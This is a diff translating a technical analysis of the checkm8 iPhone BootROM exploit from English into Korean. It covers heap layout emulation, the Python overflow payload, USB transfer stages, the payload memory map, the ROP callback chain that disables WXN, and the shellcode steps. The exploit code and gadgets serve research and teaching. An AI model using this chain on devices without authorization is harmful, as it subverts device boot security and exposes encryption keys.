     void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
     printf("chunk = %p\n", chunk);
     heap_add_chunk(chunk, 0x100000, 1);
-    malloc(0x3c0); // Align lower byte of address in SecureRAM
+    malloc(0x3c0); // SecureRAM에서 주소 하위 바이트 정렬
 
     void * descs[10];
     void * io_req[100];
@@ -497,17 +497,17 @@ int main() {
     void * task_stack = malloc(0x4000); // Task Stack
 
     void * io_buf_0 = memalign(0x800, 0x40); // io_buffer
-    void * hs = malloc(25); // High-Speed config descriptor
-    void * fs = malloc(25); // Full-Speed config descriptor
+    void * hs = malloc(25); // High-Speed 설정 디스크립터
+    void * fs = malloc(25); // Full-Speed 설정 디스크립터
 
     void * zlps[2];
 
-    for(int i = 0; i < N; i++) // alloc io_queue
+    for(int i = 0; i < N; i++) // io_queue 할당
     {
         io_req[i] = malloc(0x30);
     }
 
-    for(int i = 0; i < N; i++) // free all but 2
+    for(int i = 0; i < N; i++) // 2개 제외하고 모두 해제
     {
         if(i < 2)
         {
@@ -516,7 +516,7 @@ int main() {
         free(io_req[i]);
     }
 
-    // ... (second round of allocations)
+    // ... (두 번째 라운드 할당)
 
     printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0);
     printf("hs_off  = %#lx\n", (int64_t)hs - (int64_t)io_buf_0);
@@ -526,7 +526,7 @@ int main() {
 }
 ```
 
-Output:
+출력:
 
 ```
 chunk = 0x1004000
@@ -536,16 +536,16 @@ hs_off  = 0x4c0
 fs_off  = 0x540
 ```
 
-As shown, another `usb_device_io_request` appears at offset `0x5c0` from the start of the previous buffer.
+보다시피 또 다른 `usb_device_io_request`가 이전 버퍼 시작 위치에서 `0x5c0` 오프셋에 나타난다.
 
-This corresponds directly to the exploit code:
+이는 익스플로잇 코드에 직접 대응된다:
 
 ```python
 t8010_overwrite = '\0' * 0x5c0
 t8010_overwrite += struct.pack('<32x2Q', t8010_nop_gadget, callback_chain)
 ```
 
-The validity of these conclusions can be verified by analyzing the current state of the SecureRAM heap provided with checkm8. A small script parses the heap dump and enumerates chunks. Note that some metadata is corrupted during the `usb_device_io_request` overflow; those chunks are skipped.
+checkm8과 함께 제공되는 SecureRAM 힙의 현재 상태를 분석하여 이 결론들을 검증할 수 있다. 힙 덤프를 파싱하고 청크를 열거하는 간단한 스크립트를 작성했다. `usb_device_io_request` 오버플로 과정에서 일부 메타데이터가 손상되므로 해당 청크는 건너뛴다.
 
 ```python
 #!/usr/bin/env python3
@@ -574,7 +574,7 @@ while True:
         break
     print('chunk at', hex(cur + 0x40))
     if this_size == 0:
-        if cur in (0x9180, 0x9200, 0x9280):  # skipping damaged chunks
+        if cur in (0x9180, 0x9200, 0x9280):  # 손상된 청크 건너뜀
             this_size = 0x80
         else:
             break
@@ -583,11 +583,11 @@ while True:
     cur += this_size
 ```
 
-The lower bytes of addresses in the output match the emulation results.
+출력의 하위 바이트가 에뮬레이션 결과와 일치한다.
 
-It is also possible to overflow into the High-Speed/Full-Speed configuration descriptors immediately following the `io_buffer`. One of the configuration descriptor fields holds the total length; overflowing it allows reading beyond the descriptor. This can be experimented with by modifying the exploit.
+`io_buffer` 바로 뒤에 있는 High-Speed/Full-Speed 설정 디스크립터로 오버플로하는 것도 가능하다. 설정 디스크립터의 한 필드가 전체 길이를 담당하는데, 이를 오버플로하면 디스크립터 너머까지 읽을 수 있다. 익스플로잇을 수정해 직접 실험해볼 수 있다.
 
-### 2. Allocate and Free io_buffer Without Clearing Global State
+### 2. 전역 상태를 초기화하지 않고 io_buffer 할당 및 해제
 
 ```python
 device = dfu.acquire_device()
@@ -597,11 +597,11 @@ libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
 dfu.release_device(device)
 ```
 
-This stage creates an incomplete OUT request for an image upload.
+이 단계에서 이미지 업로드를 위한 미완성 OUT 요청이 생성된다.
 
-Simultaneously, the global state is initialized and the buffer address on the heap is written into `io_buffer`. DFU is then reset with a `DFU_CLR_STATUS` request, and a new DFU iteration begins.
+동시에 전역 상태가 초기화되고 힙의 버퍼 주소가 `io_buffer`에 기록된다. DFU는 `DFU_CLR_STATUS` 요청으로 리셋되고 새 DFU 이터레이션이 시작된다.
 
-### 3. Overwrite usb_device_io_request on the Heap via UAF
+### 3. UAF를 통해 힙의 usb_device_io_request 덮어쓰기
 
 ```python
 device = dfu.acquire_device()
@@ -612,76 +612,76 @@ leak(device)
 libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50)
 ```
 
-In this stage, a `usb_device_io_request` object is allocated on the heap and overflowed with `t8010_overwrite`.
+이 단계에서 `usb_device_io_request` 객체가 힙에 할당되고 `t8010_overwrite`로 오버플로된다.
 
-The contents of this overwrite were defined in the first stage:
+이 덮어쓰기 내용은 첫 번째 단계에서 정의했다.
 
-`t8010_nop_gadget` and `0x1800B0800` are the values that must overflow the `callback` and `next` fields of the `usb_device_io_request` structure.
+`t8010_nop_gadget`과 `0x1800B0800`은 `usb_device_io_request` 구조체의 `callback`과 `next` 필드를 오버플로해야 하는 값이다.
 
-The `t8010_nop_gadget` is shown below. Despite its name, in addition to returning, it also restores the previous LR register and skips the `free` call after the callback in `usb_core_complete_endpoint_io`. This is important because the overflow corrupts heap metadata, and a `free` attempt would break the exploit:
+`t8010_nop_gadget`은 아래와 같다. 이름과 달리 단순 반환 외에 이전 LR 레지스터를 복원하고, `usb_core_complete_endpoint_io`의 콜백 이후 `free` 호출을 건너뛴다. 오버플로로 힙 메타데이터가 손상되어 `free` 시도가 익스플로잇에 영향을 미치기 때문에 중요하다:
 
 ```
-bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0]  // restore fp, lr
+bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0]  // fp, lr 복원
 bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20
 bootrom:000000010000CC74 RET
 ```
 
-`next` points to `INSECURE_MEMORY + 0x800`. INSECURE_MEMORY will later store the exploit's payload, and the callback chain lives at payload offset `0x800`.
+`next`는 `INSECURE_MEMORY + 0x800`을 가리킨다. INSECURE_MEMORY는 나중에 익스플로잇 페이로드를 저장하며, 페이로드 오프셋 `0x800`에 callback 체인이 위치한다.
 
-### 4. Placing the Payload
+### 4. 페이로드 배치
 
 ```python
 for i in range(0, len(payload), 0x800):
     libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)
 ```
 
-All subsequent packets are placed in the memory area allocated for the image. The payload layout:
+모든 후속 패킷이 이미지에 할당된 메모리 영역에 배치된다. 페이로드 레이아웃:
 
 ```
-0x1800B0000: t8010_shellcode              # initializing shellcode
+0x1800B0000: t8010_shellcode              # 초기화 셸코드
 ...
-0x1800B0180: t8010_handler               # new USB request handler
+0x1800B0180: t8010_handler               # 새 USB 요청 핸들러
 ...
-0x1800B0400: 0x1000006a5                 # fake translation table descriptor
+0x1800B0400: 0x1000006a5                 # 가짜 translation table 디스크립터
                                          # SecureROM: 0x100000000 -> 0x100000000
-                                         # matches value in original translation table
+                                         # 원본 translation table의 값과 일치
 ...
-0x1800B0600: 0x60000180000625            # fake translation table descriptor
+0x1800B0600: 0x60000180000625            # 가짜 translation table 디스크립터
                                          # SecureRAM: 0x180000000 -> 0x180000000
-                                         # matches value in original translation table
-0x1800B0608: 0x1800006a5                 # fake translation table descriptor
-                                         # new value: 0x182000000 -> 0x180000000
-                                         # with code execution permissions
-0x1800B0610: disable_wxn_arm64           # code to disable WXN
-0x1800B0800: usb_rop_callbacks           # callback chain
+                                         # 원본 translation table의 값과 일치
+0x1800B0608: 0x1800006a5                 # 가짜 translation table 디스크립터
+                                         # 새 값: 0x182000000 -> 0x180000000
+                                         # 코드 실행 권한 포함
+0x1800B0610: disable_wxn_arm64           # WXN 비활성화 코드
+0x1800B0800: usb_rop_callbacks           # callback 체인
 ```
 
-### 5. Execution of the Callback Chain
+### 5. Callback 체인 실행
 
 ```python
 dfu.usb_reset(device)
 dfu.release_device(device)
 ```
 
-After the USB reset, a loop begins cancelling incomplete `usb_device_io_request` entries in the queue via the linked list. In the previous stage, the remaining queue was replaced to gain control over the callback chain. To build this chain, the following gadget is used:
+USB 리셋 후 링크드 리스트를 통해 큐에 있는 미완성 `usb_device_io_request` 항목들을 취소하는 루프가 시작된다. 이전 단계에서 나머지 큐를 교체해 callback 체인을 제어할 수 있게 되었다. 이 체인을 구성하기 위해 다음 가젯을 사용한다:
 
 ```
-bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request ptr; X8 = arg0, X10 = call addr
+bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request 포인터; X8 = arg0, X10 = 호출 주소
 bootrom:000000010000CC50 LSL W2, W2, W9
 bootrom:000000010000CC54 MOV X0, X8 ; arg0
-bootrom:000000010000CC58 BLR X10   ; call
+bootrom:000000010000CC58 BLR X10   ; 호출
 bootrom:000000010000CC5C CMP W0, #0
 bootrom:000000010000CC60 CSEL W0, W0, W19, LT
 bootrom:000000010000CC64 B   loc_10000CC6C
 ```
 
-As shown, the call address and first argument are loaded from offset `0x70` of the request structure. This gadget makes it trivial to issue any `f(x)` style call.
+보다시피 호출 주소와 첫 번째 인자가 request 구조체의 `0x70` 오프셋에서 로드된다. 이 가젯으로 임의의 `f(x)` 형태 호출을 쉽게 실행할 수 있다.
 
-The entire call chain can be emulated with Unicorn Engine (we used a modified version of the uEmu plugin):
+전체 호출 체인을 Unicorn Engine으로 에뮬레이션할 수 있다 (uEmu 플러그인의 수정 버전을 사용했다):
 
-![Callback chain emulation](/images/blog/checkm8-technical-analysis/Untitled-8.png)
+![Callback 체인 에뮬레이션](/images/blog/checkm8-technical-analysis/Untitled-8.png)
 
-The full chain for iPhone 7:
+iPhone 7의 전체 체인:
 
 #### 5.1. dc_civac 0x1800B0600
 
@@ -690,7 +690,7 @@ The full chain for iPhone 7:
 0000000100000470: RET
 ```
 
-Cleans and invalidates the processor cache for a virtual address. This makes the processor address into a payload.
+가상 주소에서 프로세서 캐시를 정리하고 무효화한다. 이후 프로세서 주소가 페이로드를 가리키도록 만든다.
 
 #### 5.2. dmb
 
@@ -699,11 +699,11 @@ Cleans and invalidates the processor cache for a virtual address. This makes the
 000000010000047C: RET
 ```
 
-A memory barrier ensuring all memory operations before this instruction complete. High-performance processors can execute instructions out of order for optimization; this prevents that.
+이 명령어 이전의 모든 메모리 작업이 완료되도록 보장하는 메모리 배리어다. 고성능 프로세서는 최적화를 위해 명령어를 비순서 실행할 수 있는데, 이를 방지한다.
 
 #### 5.3. enter_critical_section()
 
-Interrupts are masked for atomic execution of the subsequent operations.
+이후 작업의 원자적 실행을 위해 인터럽트가 마스킹된다.
 
 #### 5.4. write_ttbr0(0x1800B0000)
 
@@ -713,7 +713,7 @@ Interrupts are masked for atomic execution of the subsequent operations.
 00000001000003EC: RET
 ```
 
-TTBR0_EL1 is set to `0x1800B0000` — the INSECURE_MEMORY address where the exploit payload is stored. Translation descriptors are at specific payload offsets:
+TTBR0_EL1을 `0x1800B0000`으로 설정한다 — 익스플로잇 페이로드가 저장된 INSECURE_MEMORY 주소다. Translation 디스크립터는 페이로드의 특정 오프셋에 위치한다:
 
 ```
 0x1800B0400: 0x1000006a5       0x100000000 -> 0x100000000 (rx)
@@ -732,7 +732,7 @@ TTBR0_EL1 is set to `0x1800B0000` — the INSECURE_MEMORY address where the expl
 0000000100000444: RET
 ```
 
-The translation table is invalidated so that addresses are translated according to the new translation table.
+새 translation table에 따라 주소를 변환하도록 translation table이 무효화된다.
 
 #### 5.6. 0x1820B0610 — disable_wxn_arm64
 
@@ -751,7 +751,7 @@ ISB
 RET
 ```
 
-WXN (Write permission implies Execute-Never) is disabled to allow code execution from RW memory. The translation table has been modified to enable execution of this WXN disable code.
+RW 메모리에서 코드를 실행할 수 있도록 WXN(Write permission implies Execute-Never)이 비활성화된다. Translation table이 수정되어 이 WXN 비활성화 코드를 실행할 수 있게 되었다.
 
 #### 5.7. write_ttbr0(0x1800A0000)
 
@@ -761,59 +761,59 @@ WXN (Write permission implies Execute-Never) is disabled to allow code execution
 00000001000003EC: RET
 ```
 
-The original value of TTBR0_EL1 is restored. Since INSECURE_MEMORY data is overwritten, BootROM must work correctly during virtual address translation.
+TTBR0_EL1의 원래 값이 복원된다. INSECURE_MEMORY 데이터가 덮어쓰이므로 가상 주소 변환 중 BootROM이 올바르게 동작해야 한다.
 
 #### 5.8. tlbi
 
-The translation table is reset again.
+Translation table이 다시 리셋된다.
 
 #### 5.9. exit_critical_section()
 
-Interrupt handling returns to normal.
+인터럽트 핸들링이 정상으로 복귀한다.
 
 #### 5.10. 0x1800B0000
 
-Control is transferred to the initializing shellcode.
+제어가 초기화 셸코드로 이전된다.
 
-The primary goal of the callback chain is therefore: **disable WXN and transfer control to shellcode in RW memory**.
+따라서 callback 체인의 주요 목적은 **WXN을 비활성화하고 RW 메모리의 셸코드로 제어를 이전**하는 것이다.
 
-### 6. Execution of Shellcode
+### 6. 셸코드 실행
 
-The shellcode lives in `src/checkm8_arm64.S` and performs the following steps:
+셸코드는 `src/checkm8_arm64.S`에 있으며 다음 단계를 수행한다:
 
-#### 6.1. Overwriting USB Configuration Descriptors
+#### 6.1. USB 설정 디스크립터 덮어쓰기
 
-Global memory holds pointers to two configuration descriptors on the heap: `usb_core_hs_configuration_descriptor` and `usb_core_fs_configuration_descriptor`. These were corrupted in Stage 3. Since they are required for correct USB device interaction, the shellcode restores them.
+전역 메모리에는 힙의 두 설정 디스크립터(`usb_core_hs_configuration_descriptor`, `usb_core_fs_configuration_descriptor`)에 대한 포인터가 저장된다. 3단계에서 이 디스크립터들이 손상되었다. USB 장치와의 올바른 상호 작용에 필요하므로 셸코드가 이를 복원한다.
 
-#### 6.2. Changing the USB Serial Number
+#### 6.2. USB 시리얼 번호 변경
 
-A new string descriptor is written with the substring `"PWND:[checkm8]"` appended to the serial number. This allows verifying whether the exploit succeeded.
+시리얼 번호에 `"PWND:[checkm8]"` 부분 문자열이 추가된 새 문자열 디스크립터가 작성된다. 이를 통해 익스플로잇 성공 여부를 확인할 수 있다.
 
-#### 6.3. Overwriting the USB Request Handler Pointer
+#### 6.3. USB 요청 핸들러 포인터 덮어쓰기
 
-The original USB request handler pointer for the interface is overwritten with a pointer to a new handler, which will be placed in memory along with subsequent handlers.
+인터페이스의 원래 USB 요청 핸들러 포인터가 새 핸들러의 포인터로 덮어써진다. 새 핸들러는 이후 메모리에 배치된다.
 
-#### 6.4. Copying USB Request Handler to the TRAMPOLINE Memory Area (0x1800AFC00)
+#### 6.4. USB 요청 핸들러를 TRAMPOLINE 메모리 영역으로 복사 (0x1800AFC00)
 
-When a USB request is received, the new handler checks the request's `wValue` against `0xffff`. If not equal, control is passed back to the original handler. If equal, various commands can be executed from the new handler — including `memcpy`, `memset`, and `exec`-family functions (effectively PC control).
+USB 요청이 수신되면 새 핸들러가 요청의 `wValue`를 `0xffff`와 비교한다. 같지 않으면 원래 핸들러로 제어를 넘기고, 같으면 새 핸들러에서 `memcpy`, `memset`, `exec` 계열 함수 등 다양한 명령을 실행할 수 있다(사실상 PC 제어).
 
-**This completes the exploit analysis.**
+**이로써 익스플로잇 분석이 완료되었다.**
 
-## USB Low-Level Exploit Implementation
+## USB 로우 레벨 익스플로잇 구현
 
-As a bonus example of low-level USB attacks, a proof-of-concept Arduino implementation of checkm8 using a USB Host Shield was published. The PoC works on iPhone 7 but can be ported to other devices. When an iPhone 7 in DFU mode is connected to the USB Host Shield, all steps described in this document are executed and the device enters `PWND:[checkm8]` mode. It can then be connected to a PC via USB and used with ipwndfu (for memory dumps, crypto key access, etc.).
+USB 로우 레벨 공격의 보너스 예시로, USB Host Shield를 이용한 Arduino에서의 checkm8 PoC가 공개되었다. PoC는 iPhone 7에서 작동하며 다른 장치로 쉽게 이식 가능하다. DFU 모드의 iPhone 7을 USB Host Shield에 연결하면 이 문서에 설명된 모든 단계가 실행되고 장치가 `PWND:[checkm8]` 모드로 진입한다. 이후 USB로 PC에 연결해 ipwndfu를 사용할 수 있다(메모리 덤프, 암호화 키 접근 등).
 
-This approach is more reliable than using asynchronous requests with minimal timeouts because it works directly with the USB controller.
+이 방법은 USB 컨트롤러와 직접 통신하기 때문에 최소 타임아웃의 비동기 요청을 사용하는 방법보다 더 안정적이다.
 
 ![Arduino USB Host Shield PoC](https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg)
 
-## Conclusion
+## 결론
 
-This vulnerability continues to impact the jailbreak community. A jailbreak based on checkm8 — known as checkra1n — was already in development. Since the vulnerability cannot be patched, it will always work on affected chips (A5 through A11) regardless of iOS version. Many additional affected devices exist, including Apple Watch and Apple TV.
+이 취약점은 탈옥 커뮤니티에 계속 영향을 미치고 있다. checkm8 기반의 탈옥인 checkra1n이 이미 개발 중이었으며, 이 취약점은 패치할 수 없으므로 iOS 버전과 관계없이 취약한 칩(A5~A11)에서 항상 동작한다. Apple Watch, Apple TV 등 영향받는 장치도 많다.
 
-Beyond jailbreaking, this vulnerability also affects researchers studying Apple devices. With checkm8 it is already possible to boot an iOS device in verbose mode, dump the SecureROM, and decrypt firmware images using GID keys. The most interesting application, however, is entering debug mode on vulnerable devices using a special JTAG/SWD cable — something previously only possible with special prototype hardware or specialized service assistance. checkm8 makes Apple hardware research significantly easier and more accessible.
+탈옥 외에도 이 취약점은 Apple 기기를 연구하는 연구자들에게도 큰 의미가 있다. checkm8으로 이미 iOS 장치를 상세 모드로 부팅하거나, SecureROM을 덤프하거나, GID 키로 펌웨어 이미지를 복호화할 수 있다. 그러나 가장 흥미로운 응용은 특수 JTAG/SWD 케이블을 사용해 취약한 장치에서 디버그 모드로 진입하는 것이다. 이전에는 특수 프로토타입 하드웨어나 전문 서비스의 도움이 있어야만 가능했던 일이다. checkm8은 Apple 하드웨어 연구를 훨씬 쉽고 접근하기 용이하게 만들었다.
 
-## References
+## 참고 문헌
 
 1. Jonathan Levin, [*OS Internals: iBoot*](http://newosxbook.com/bonus/iBoot.pdf)
 2. Apple, [iOS Security Guide](https://support.apple.com/guide/security/welcome/web)
